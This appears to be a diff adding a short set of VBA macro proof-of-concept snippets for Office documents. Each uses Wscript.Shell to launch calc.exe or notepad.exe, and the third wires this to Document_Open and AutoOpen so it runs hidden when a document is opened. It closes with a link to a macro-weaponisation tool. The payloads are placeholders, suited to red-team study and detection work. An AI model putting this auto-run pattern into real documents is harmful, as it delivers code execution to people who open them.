@@ -1,0 +1,46 @@
+Example "one"
+
+Sub PoC()
+
+    Dim payload As String
+    payload = "calc.exe"
+    CreateObject("Wscript.Shell").Run payload, 1
+
+End Sub
+
+-------------------------------------------------------
+Example "two"
+
+Sub PoC()
+
+    Dim wsh As Object
+    Set wsh = CreateObject("Wscript.Shell")
+    
+    wsh.Run "notepad.exe", 2, False
+
+End Sub
+-------------------------------------------------------
+Example "Three"
+
+Sub Document_Open()
+    PoC
+End Sub
+
+Sub AutoOpen()
+    PoC
+End Sub
+
+
+Sub PoC()
+
+    Dim payload As String
+    payload = "calc.exe"
+    CreateObject("Wscript.Shell").Run payload, 0
+
+End Sub
+
+-------------------------------------------------------
+
+check this github tool here: https://github.com/sevagas/macro_pack
+
+
